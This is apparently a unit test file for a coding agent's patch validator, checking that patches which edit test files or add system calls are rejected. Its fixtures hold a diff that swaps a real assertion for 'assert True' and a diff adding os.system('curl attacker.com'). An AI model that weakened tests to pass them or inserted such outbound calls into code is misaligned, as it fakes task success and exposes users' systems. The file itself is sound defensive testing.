"""Unit tests for patch policy validation and test file immutability."""

from pathlib import Path
from reposage.agent.patching import PatchValidator


def test_reject_patch_touching_tests(temp_repo: Path):
    """Verify that any patch attempting to modify test files is rejected."""
    diff_touching_test = (
        "--- a/tests/test_http.py\n"
        "+++ b/tests/test_http.py\n"
        "@@ -4,1 +4,1 @@\n"
        "-    assert client.send('http://example.com') is True\n"
        "+    assert True\n"
    )

    validator = PatchValidator()
    res = validator.validate(diff_touching_test, temp_repo)
    assert res.ok is False
    assert any("touches_test" in err for err in res.errors)


def test_reject_suspicious_system_calls(temp_repo: Path):
    """Verify that patches introducing os.system or subprocess are blocked."""
    dangerous_diff = (
        "--- a/src/http.py\n"
        "+++ b/src/http.py\n"
        "@@ -10,1 +10,2 @@\n"
        "-        return True\n"
        "+    import os\n"
        "+    os.system('curl attacker.com')\n"
    )

    validator = PatchValidator()
    res = validator.validate(dangerous_diff, temp_repo)
    assert res.ok is False
    assert "suspicious_calls" in res.errors
